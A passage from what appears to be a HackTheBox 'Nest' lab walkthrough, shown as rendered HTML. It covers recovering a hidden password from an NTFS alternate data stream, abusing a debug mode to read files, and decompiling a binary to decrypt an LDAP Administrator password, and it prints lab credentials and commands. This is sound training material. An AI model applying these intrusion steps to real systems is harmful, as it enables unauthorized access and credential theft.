+getting file <span class="se">\C</span>.Smith<span class="se">\H</span>QK Reporting<span class="se">\H</span>QK_Config_Backup.xml of size 249 as HQK Reporting/HQK_Config_Backup.xml <span class="o">(</span>0.7 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 0.3 KiloBytes/sec<span class="o">)</span>
+getting file <span class="se">\C</span>.Smith<span class="se">\H</span>QK Reporting<span class="se">\A</span>D Integration Module<span class="se">\H</span>qkLdap.exe of size 17408 as HQK Reporting/AD Integration Module/HqkLdap.exe <span class="o">(</span>23.0 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 10.1 KiloBytes/sec<span class="o">)</span>
+smb: <span class="se">\C</span>.Smith<span class="se">\&gt;</span> <span class="nb">exit</span>
+
+❯ <span class="nb">cat </span>user.txt
+───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+       │ File: user.txt
+───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+   1   │ 1ab7d1...
+───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+</pre></td></tr></tbody></table></code></div></div>
+
+<hr />
+
+<h2 id="privilege-escalation"><span class="me-2">Privilege Escalation</span><a href="#privilege-escalation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
+
+<p>If we dive into the <code class="language-plaintext highlighter-rouge">HQK Reporting</code> folder, we will find some interesting files.
+There is a file named <code class="language-plaintext highlighter-rouge">Debug Mode Password.txt</code>, but it is empty.
+Reading the <code class="language-plaintext highlighter-rouge">HQK_Config_Backup.xml</code> file we’ll find an element containing the same port we saw for <code class="language-plaintext highlighter-rouge">Reporting Service V1.2</code> (4386).</p>
+
+<div class="language-xml highlighter-rouge"><div class="code-header">
+        <span data-label-text="XML"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre></td><td class="rouge-code"><pre>❯ cat HQK_Config_Backup.xml
+───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+       │ File: HQK_Config_Backup.xml
+───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+   1   │ <span class="cp">&lt;?xml version="1.0"?&gt;</span>
+   2   │ <span class="nt">&lt;ServiceSettings</span> <span class="na">xmlns:xsi=</span><span class="s">"http://www.w3.org/2001/XMLSchema-instance"</span> <span class="na">xmlns:xsd=</span><span class="s">"http://www.w3.org/2001/XMLSchema"</span><span class="nt">&gt;</span>
+   3   │   <span class="nt">&lt;Port&gt;</span>4386<span class="nt">&lt;/Port&gt;</span>
+   4   │   <span class="nt">&lt;QueryDirectory&gt;</span>C:\Program Files\HQK\ALL QUERIES<span class="nt">&lt;/QueryDirectory&gt;</span>
+   5   │ <span class="nt">&lt;/ServiceSettings&gt;</span>
+───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>We can use telnet to interact with that service and investigate what it does.</p>
+
+<h3 id="interacting-with-hqk-service"><span class="me-2">Interacting with HQK Service</span><a href="#interacting-with-hqk-service" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
+
+<p>Connecting with the service, we discovered that we’re dealing with a service named <code class="language-plaintext highlighter-rouge">HQK Reporting Service V1.2</code>, I’m not sure if this service was developed for this machine or if it is actually used in real environments, anyway I couldn’t find any information on Google.</p>
+
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+</pre></td><td class="rouge-code"><pre>❯ telnet 10.10.10.178 4386
+Trying 10.10.10.178...
+Connected to 10.10.10.178.
+Escape character is <span class="s1">'^]'</span><span class="nb">.</span>
+
+HQK Reporting Service V1.2
+
+<span class="o">&gt;</span>?
+
+Unrecognised <span class="nb">command</span>
+<span class="o">&gt;</span><span class="nb">help
+
+</span>This service allows <span class="nb">users </span>to run queries against databases using the legacy HQK format
+
+<span class="nt">---</span> AVAILABLE COMMANDS <span class="nt">---</span>
+
+LIST
+SETDIR &lt;Directory_Name&gt;
+RUNQUERY &lt;Query_ID&gt;
+DEBUG &lt;Password&gt;
+HELP &lt;Command&gt;
+<span class="o">&gt;</span>
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>Using the <code class="language-plaintext highlighter-rouge">Help</code> command we see five available commands.</p>
+
+<ol>
+  <li><code class="language-plaintext highlighter-rouge">LIST</code> will list the content of the actual directory (like <code class="language-plaintext highlighter-rouge">ls</code>).</li>
+  <li><code class="language-plaintext highlighter-rouge">SETDIR</code> will change the current directory(like <code class="language-plaintext highlighter-rouge">cd</code>).</li>
+  <li><code class="language-plaintext highlighter-rouge">RUNQUERY</code> will fail due an invalid database configuration.</li>
+  <li><code class="language-plaintext highlighter-rouge">DEBUG</code> is unknown, it requires a password.</li>
+</ol>
+
+<p>Unfortunately, there isn’t much we can do with these commands. There is no point on navigate the file system if we can’t read files with <code class="language-plaintext highlighter-rouge">RUNQUERY</code> command.</p>
+
+<p>But we still don’t know what the <code class="language-plaintext highlighter-rouge">DEBUG</code> command does. If only we had the password…</p>
+
+<p>There ins’t much we can do with the <code class="language-plaintext highlighter-rouge">HqkLdap.exe</code> binary except waste our time trying to find something in it’s source code.
+If we remember there were a file named <code class="language-plaintext highlighter-rouge">Debug Mode Password.txt</code>, but it was empty.</p>
+
+<p>Damn, a dead end?! It was for me.</p>
+
+<h3 id="ads-in-smb-share"><span class="me-2">ADS In SMB Share</span><a href="#ads-in-smb-share" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
+
+<blockquote>
+  <h4 id="ads-concept"><span class="me-2">ADS Concept</span><a href="#ads-concept" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>
+</blockquote>
+
+<p>NTFS file systems have a feature called <code class="language-plaintext highlighter-rouge">Alternate Data Streams</code>, this allows you to add a another data stream to a file, this means that you can add aditional data to be associated with a file or directory beyond the standard data stream. This allow you to ‘hide’ <strong>any type</strong> of file within another one (executables, images, videos, etc). Something scary about ADS is that this attribute is not visible in Windows File Explorer, it doesn’t modify the size of the file and it will not change checksum values.
+While NTFS uses <code class="language-plaintext highlighter-rouge">ADS</code> primarily to store metadata and extended attributes, it can also be used to store files.
+If you want to know learn more about ADS, I’d recommend this article:
+<a href="https://blog.netwrix.com/2022/12/16/alternate_data_stream/">How NTFS Alternate Data Streams Introduce Security Vulnerability</a>.</p>
+
+<blockquote>
+  <h4 id="looking-for-ads-attribute"><span class="me-2">Looking for ADS Attribute</span><a href="#looking-for-ads-attribute" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>
+</blockquote>
+
+<p>We can return to the C.Smith SMB Share and search for detailed metadata information, we can do it using the <code class="language-plaintext highlighter-rouge">allinfo &lt;file&gt;</code> SMB command.</p>
+
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+</pre></td><td class="rouge-code"><pre>❯ smbclient <span class="s2">"//10.10.10.178/Users/"</span> <span class="nt">-U</span> <span class="s2">"c.smith%xRxRxPANCAK3SxRxRx"</span>
+Try <span class="s2">"help"</span> to get a list of possible commands.
+smb: <span class="se">\&gt;</span> <span class="nb">cd </span>C.Smith
+smb: <span class="se">\C</span>.Smith<span class="se">\&gt;</span> <span class="nb">cd</span> <span class="s2">"HQK Reporting"</span>
+smb: <span class="se">\C</span>.Smith<span class="se">\H</span>QK Reporting<span class="se">\&gt;</span> allinfo ./HQK_Config_Backup.xml
+altname: HQK_CO~1.XML
+create_time:    Wed Aug  7 02:12:31 PM 2019 MST
+access_time:    Thu Aug  8 03:59:35 AM 2019 MST
+write_time:     Thu Aug  8 04:09:06 PM 2019 MST
+change_time:    Wed Jul 21 11:47:15 AM 2021 MST
+attributes: A <span class="o">(</span>20<span class="o">)</span>
+stream: <span class="o">[</span>::<span class="nv">$DATA</span><span class="o">]</span>, 249 bytes
+smb: <span class="se">\C</span>.Smith<span class="se">\H</span>QK Reporting<span class="se">\&gt;</span>
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>The primary data stream of a file is always named <code class="language-plaintext highlighter-rouge">$DATA</code>. As we can see, this is the only data stream in the <code class="language-plaintext highlighter-rouge">HQK_Config_Backup.xml</code> file. Let’s examine other files to see if there are additional data streams.</p>
+
+<p>We’ve found an additional data stream in the <code class="language-plaintext highlighter-rouge">Debug Mode Password.txt</code> file named <code class="language-plaintext highlighter-rouge">Password</code>, it appears to contain the password needed to access the HQK Service with DEBUG privileges.</p>
+
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+</pre></td><td class="rouge-code"><pre>smb: <span class="se">\C</span>.Smith<span class="se">\H</span>QK Reporting<span class="se">\&gt;</span> allinfo <span class="s2">"Debug Mode Password.txt"</span>
+altname: DEBUGM~1.TXT
+create_time:    Thu Aug  8 04:06:12 PM 2019 MST
+access_time:    Thu Aug  8 04:06:12 PM 2019 MST
+write_time:     Thu Aug  8 04:08:17 PM 2019 MST
+change_time:    Wed Jul 21 11:47:12 AM 2021 MST
+attributes: A <span class="o">(</span>20<span class="o">)</span>
+stream: <span class="o">[</span>::<span class="nv">$DATA</span><span class="o">]</span>, 0 bytes
+stream: <span class="o">[</span>:Password:<span class="nv">$DATA</span><span class="o">]</span>, 15 bytes
+smb: <span class="se">\C</span>.Smith<span class="se">\H</span>QK Reporting<span class="se">\&gt;</span> get <span class="s2">"Debug Mode Password.txt"</span>:Password
+getting file <span class="se">\C</span>.Smith<span class="se">\H</span>QK Reporting<span class="se">\D</span>ebug Mode Password.txt:Password of size 15 as Debug Mode Password.txt:Password <span class="o">(</span>0.0 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 0.2 KiloBytes/sec<span class="o">)</span>
+smb: <span class="se">\C</span>.Smith<span class="se">\H</span>QK Reporting<span class="se">\&gt;</span>
+
+❯ <span class="nb">cat </span>Debug<span class="se">\ </span>Mode<span class="se">\ </span>Password.txt:Password
+───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+       │ File: Debug Mode Password.txt:Password
+───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+   1   │ WBQ201953D8w
+───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+</pre></td></tr></tbody></table></code></div></div>
+
+<h3 id="hqk-service-debug-mode"><span class="me-2">HQK Service DEBUG Mode</span><a href="#hqk-service-debug-mode" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
+
+<p>We’ve obtained DEBUG and now we have access to a few new commands. However, we still can’t execute queries and continue receiving the same error message.</p>
+
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+</pre></td><td class="rouge-code"><pre>❯ telnet 10.10.10.178 4386
+Trying 10.10.10.178...
+Connected to 10.10.10.178.
+Escape character is <span class="s1">'^]'</span><span class="nb">.</span>
+
+HQK Reporting Service V1.2
+
+<span class="o">&gt;</span>DEBUG WBQ201953D8w
+
+Debug mode enabled. Use the HELP <span class="nb">command </span>to view additional commands that are now available
+<span class="o">&gt;</span>HELP
+
+This service allows <span class="nb">users </span>to run queries against databases using the legacy HQK format
+
+<span class="nt">---</span> AVAILABLE COMMANDS <span class="nt">---</span>
+
+LIST
+SETDIR &lt;Directory_Name&gt;
+RUNQUERY &lt;Query_ID&gt;
+DEBUG &lt;Password&gt;
+HELP &lt;Command&gt;
+SERVICE
+SESSION
+SHOWQUERY &lt;Query_ID&gt;
+<span class="o">&gt;</span>
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>The <code class="language-plaintext highlighter-rouge">SERVICE</code> command provices information about server such as, the server hostname, a path to the service executable, and some other details.</p>
+
+<p>The <code class="language-plaintext highlighter-rouge">SESSION</code> also gives information, but it’s even less useful.</p>
+
+<p>The <code class="language-plaintext highlighter-rouge">SHOWQUERY &lt;Query_Id&gt;</code> command appears to query certain attributes in the files, interesting…</p>
+
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+</pre></td><td class="rouge-code"><pre><span class="o">&gt;</span>LIST
+
+Use the query ID numbers below with the RUNQUERY <span class="nb">command </span>and the directory names with the SETDIR <span class="nb">command
+
+ </span>QUERY FILES IN CURRENT DIRECTORY
+
+<span class="o">[</span>DIR]  COMPARISONS
+<span class="o">[</span>1]   Invoices <span class="o">(</span>Ordered By Customer<span class="o">)</span>
+<span class="o">[</span>2]   Products Sold <span class="o">(</span>Ordered By Customer<span class="o">)</span>
+<span class="o">[</span>3]   Products Sold In Last 30 Days
+
+Current Directory: ALL QUERIES
+<span class="o">&gt;</span>SHOWQUERY 1
+
+<span class="nv">TITLE</span><span class="o">=</span>Invoices <span class="o">(</span>Ordered By Customer<span class="o">)</span>
+<span class="nv">QUERY_MODE</span><span class="o">=</span>VIEW
+<span class="nv">QUERY_TYPE</span><span class="o">=</span>INVOICE
+<span class="nv">SORTBY</span><span class="o">=</span>CUSTOMER
+<span class="nv">DATERANGE</span><span class="o">=</span>ALL
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>Remember that we can use <code class="language-plaintext highlighter-rouge">SETDIR</code> command to change our location in the filesystem. So now we can use <code class="language-plaintext highlighter-rouge">SHOWQUERY</code> command to obtain file information or even read the files. Look:</p>
+
+<div class="language-xml highlighter-rouge"><div class="code-header">
+        <span data-label-text="XML"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+</pre></td><td class="rouge-code"><pre>&gt;SETDIR ..\
+
+Current directory set to HQK
+&gt;LIST
+
+Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command
+
+ QUERY FILES IN CURRENT DIRECTORY
+
+[DIR]  ALL QUERIES
+[DIR]  LDAP
+[DIR]  Logs
+[1]   HqkSvc.exe
+[2]   HqkSvc.InstallState
+[3]   HQK_Config.xml
+
+Current Directory: HQK
+&gt;SHOWQUERY 3
+
+<span class="cp">&lt;?xml version="1.0"?&gt;</span>
+<span class="nt">&lt;ServiceSettings</span> <span class="na">xmlns:xsi=</span><span class="s">"http://www.w3.org/2001/XMLSchema-instance"</span> <span class="na">xmlns:xsd=</span><span class="s">"http://www.w3.org/2001/XMLSchema"</span><span class="nt">&gt;</span>
+  <span class="nt">&lt;Port&gt;</span>4386<span class="nt">&lt;/Port&gt;</span>
+  <span class="nt">&lt;DebugPassword&gt;</span>WBQ201953D8w<span class="nt">&lt;/DebugPassword&gt;</span>
+  <span class="nt">&lt;QueryDirectory&gt;</span>C:\Program Files\HQK\ALL QUERIES<span class="nt">&lt;/QueryDirectory&gt;</span>
+<span class="nt">&lt;/ServiceSettings&gt;</span>
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>While navigating the filesystem, we’ll find a folder named <code class="language-plaintext highlighter-rouge">LDAP</code>. This folder contains two files:</p>
+
+<ol>
+  <li><code class="language-plaintext highlighter-rouge">HqkLdap.exe</code> (the same binary found in C.Smith SMB share)</li>
+  <li><code class="language-plaintext highlighter-rouge">Ldap.conf</code></li>
+</ol>
+
+<p>The second one (Ldap.conf) seems very interesting. Let’s take a look at it’s content.</p>
+
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+</pre></td><td class="rouge-code"><pre><span class="o">&gt;</span>list
+
+Use the query ID numbers below with the RUNQUERY <span class="nb">command </span>and the directory names with the SETDIR <span class="nb">command
+
+ </span>QUERY FILES IN CURRENT DIRECTORY
+
+<span class="o">[</span>1]   HqkLdap.exe
+<span class="o">[</span>2]   Ldap.conf
+
+Current Directory: ldap
+<span class="o">&gt;</span>showquery 2
+
+<span class="nv">Domain</span><span class="o">=</span>nest.local
+<span class="nv">Port</span><span class="o">=</span>389
+<span class="nv">BaseOu</span><span class="o">=</span><span class="nv">OU</span><span class="o">=</span>WBQ Users,OU<span class="o">=</span>Production,DC<span class="o">=</span>nest,DC<span class="o">=</span><span class="nb">local
+</span><span class="nv">User</span><span class="o">=</span>Administrator
+<span class="nv">Password</span><span class="o">=</span>yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4<span class="o">=</span>
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>Nice, it’s the administrator password!, Right?
+Well, just like with C.Smith’s password, this one is encrypted, we can try using <code class="language-plaintext highlighter-rouge">RuScanner</code> decryption function, as we did with C.Smith’s password, but it will fail since it’s using different values for encryption.</p>
+
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td><td class="rouge-code"><pre>xxd &lt;<span class="o">(</span><span class="nb">base64</span> <span class="nt">-d</span>  <span class="o">&lt;&lt;&lt;</span> <span class="s2">"yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4="</span><span class="o">)</span>
+00000000: cb21 2ad1 4bef 86ad ae40 e716 1bca 5e2e  .!<span class="k">*</span>.K....@....^.
+00000010: 8791 41e8 6a8a 9fdf 29d7 86fe 48c4 55be  ..A.j...<span class="o">)</span>...H.U.
+</pre></td></tr></tbody></table></code></div></div>
+
+<h3 id="diving-into-the-hqkldapexe-source-code"><span class="me-2">Diving into the HqkLdap.exe source code</span><a href="#diving-into-the-hqkldapexe-source-code" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
+
+<p>We found some very interesting attributes. If we decompile the <code class="language-plaintext highlighter-rouge">HqkLdap.exe</code> binary using dnSpy and navigate to <code class="language-plaintext highlighter-rouge">MainModule</code> class, we will see the purpose of <code class="language-plaintext highlighter-rouge">Ldap.Conf</code>. Let’s see where is being used.</p>
+
+<p><a href="/assets/img/HackTheBox/Nest/img_8.png" class="popup img-link  shimmer"><img src="/assets/img/HackTheBox/Nest/img_8.png" alt="img_8" loading="lazy"></a></p>
+
+<p>We can see that there are things happening here; the application is doing the following:</p>
+
+<p>1.- Verify the count of commandline arguments is equal to one.</p>
+
+<div class="language-cs highlighter-rouge"><div class="code-header">
+        <span data-label-text="C#"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="k">if</span> <span class="p">(</span><span class="n">MyProject</span><span class="p">.</span><span class="n">Application</span><span class="p">.</span><span class="n">CommandLineArgs</span><span class="p">.</span><span class="n">Count</span> <span class="p">!=</span> <span class="m">1</span><span class="p">)</span>
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>2.- Verify that the file specified in the argument exists. (Here is where <code class="language-plaintext highlighter-rouge">Ldap.conf</code> must be)</p>
+
+<div class="language-cs highlighter-rouge"><div class="code-header">
+        <span data-label-text="C#"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="k">else</span> <span class="k">if</span> <span class="p">(!</span><span class="n">File</span><span class="p">.</span><span class="nf">Exists</span><span class="p">(</span><span class="n">MyProject</span><span class="p">.</span><span class="n">Application</span><span class="p">.</span><span class="n">CommandLineArgs</span><span class="p">[</span><span class="m">0</span><span class="p">]))</span>
+</pre></td></tr></tbody></table></code></div></div>
+
+<ol>
+  <li>Verify that the <code class="language-plaintext highlighter-rouge">HqkDbImport.exe</code> file exists.</li>
+</ol>
+
+<div class="language-cs highlighter-rouge"><div class="code-header">
+        <span data-label-text="C#"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="k">else</span> <span class="k">if</span> <span class="p">(!</span><span class="n">File</span><span class="p">.</span><span class="nf">Exists</span><span class="p">(</span><span class="s">"HqkDbImport.exe"</span><span class="p">))</span>
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>4.- Break the file specified in the arguments into a string array separated by line feeds.</p>
+
+<div class="language-cs highlighter-rouge"><div class="code-header">
+        <span data-label-text="C#"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="kt">string</span><span class="p">[]</span> <span class="n">array</span> <span class="p">=</span> <span class="n">File</span><span class="p">.</span><span class="nf">ReadAllLines</span><span class="p">(</span><span class="n">MyProject</span><span class="p">.</span><span class="n">Application</span><span class="p">.</span><span class="n">CommandLineArgs</span><span class="p">[</span><span class="m">0</span><span class="p">]);</span>
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>5.- Iterate over the string array</p>
+
+<div class="language-cs highlighter-rouge"><div class="code-header">
+        <span data-label-text="C#"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td><td class="rouge-code"><pre><span class="k">foreach</span> <span class="p">(</span><span class="kt">string</span> <span class="n">text</span> <span class="k">in</span> <span class="n">array</span><span class="p">){</span>
+  <span class="c1">///</span>
+<span class="p">}</span>
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>6.- Verify is the current string starts with “Domain=”. if it does, assign it as a property in the <code class="language-plaintext highlighter-rouge">ldapSearchSettings</code> object. Do the same for “User=” and “Password=” for the corresponging values in the string array.</p>
+
+<div class="language-cs highlighter-rouge"><div class="code-header">
+        <span data-label-text="C#"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+</pre></td><td class="rouge-code"><pre><span class="k">if</span> <span class="p">(</span><span class="n">text</span><span class="p">.</span><span class="nf">StartsWith</span><span class="p">(</span><span class="s">"Domain="</span><span class="p">,</span> <span class="n">StringComparison</span><span class="p">.</span><span class="n">CurrentCultureIgnoreCase</span><span class="p">))</span>
+<span class="p">{</span>
+	<span class="n">ldapSearchSettings</span><span class="p">.</span><span class="n">Domain</span> <span class="p">=</span> <span class="n">text</span><span class="p">.</span><span class="nf">Substring</span><span class="p">(</span><span class="n">text</span><span class="p">.</span><span class="nf">IndexOf</span><span class="p">(</span><span class="sc">'='</span><span class="p">)</span> <span class="p">+</span> <span class="m">1</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">text</span><span class="p">.</span><span class="nf">StartsWith</span><span class="p">(</span><span class="s">"User="</span><span class="p">,</span> <span class="n">StringComparison</span><span class="p">.</span><span class="n">CurrentCultureIgnoreCase</span><span class="p">))</span>
+<span class="p">{</span>
+	<span class="n">ldapSearchSettings</span><span class="p">.</span><span class="n">Username</span> <span class="p">=</span> <span class="n">text</span><span class="p">.</span><span class="nf">Substring</span><span class="p">(</span><span class="n">text</span><span class="p">.</span><span class="nf">IndexOf</span><span class="p">(</span><span class="sc">'='</span><span class="p">)</span> <span class="p">+</span> <span class="m">1</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">text</span><span class="p">.</span><span class="nf">StartsWith</span><span class="p">(</span><span class="s">"Password="</span><span class="p">,</span> <span class="n">StringComparison</span><span class="p">.</span><span class="n">CurrentCultureIgnoreCase</span><span class="p">))</span>
+<span class="p">{</span>
+	<span class="n">ldapSearchSettings</span><span class="p">.</span><span class="n">Password</span> <span class="p">=</span> <span class="n">CR</span><span class="p">.</span><span class="nf">DS</span><span class="p">(</span><span class="n">text</span><span class="p">.</span><span class="nf">Substring</span><span class="p">(</span><span class="n">text</span><span class="p">.</span><span class="nf">IndexOf</span><span class="p">(</span><span class="sc">'='</span><span class="p">)</span> <span class="p">+</span> <span class="m">1</span><span class="p">));</span>
+<span class="p">}</span>
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>Once the <code class="language-plaintext highlighter-rouge">ldapSearchSettings</code> object has Domain, Username and Password attributes, it creates an instance of the <code class="language-plaintext highlighter-rouge">Ldap</code> class using these attributes. It then uses this instance to call the <code class="language-plaintext highlighter-rouge">Ldap.FindUsers</code> method and save the result in a generic list of strings.</p>
+
+<div class="language-cs highlighter-rouge"><div class="code-header">
+        <span data-label-text="C#"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre></td><td class="rouge-code"><pre><span class="n">Ldap</span> <span class="n">ldap</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">Ldap</span><span class="p">();</span>
+<span class="n">ldap</span><span class="p">.</span><span class="n">Username</span> <span class="p">=</span> <span class="n">ldapSearchSettings</span><span class="p">.</span><span class="n">Username</span><span class="p">;</span>
+<span class="n">ldap</span><span class="p">.</span><span class="n">Password</span> <span class="p">=</span> <span class="n">ldapSearchSettings</span><span class="p">.</span><span class="n">Password</span><span class="p">;</span>
+<span class="n">ldap</span><span class="p">.</span><span class="n">Domain</span> <span class="p">=</span> <span class="n">ldapSearchSettings</span><span class="p">.</span><span class="n">Domain</span><span class="p">;</span>
+<span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="s">"Performing LDAP query..."</span><span class="p">);</span>
+<span class="n">List</span><span class="p">&lt;</span><span class="kt">string</span><span class="p">&gt;</span> <span class="n">list</span> <span class="p">=</span> <span class="n">ldap</span><span class="p">.</span><span class="nf">FindUsers</span><span class="p">();</span>
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>Then iterate through list of users, print each user’s value and execute <code class="language-plaintext highlighter-rouge">HqkDbImport.exe /ImportLdapUser &lt;user&gt;</code> for each one. We don’t know exactly what ‘HqkDbImport.exe’ does, but we know that it performs some kind of user import to a database.</p>
+
+<div class="language-cs highlighter-rouge"><div class="code-header">
+        <span data-label-text="C#"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
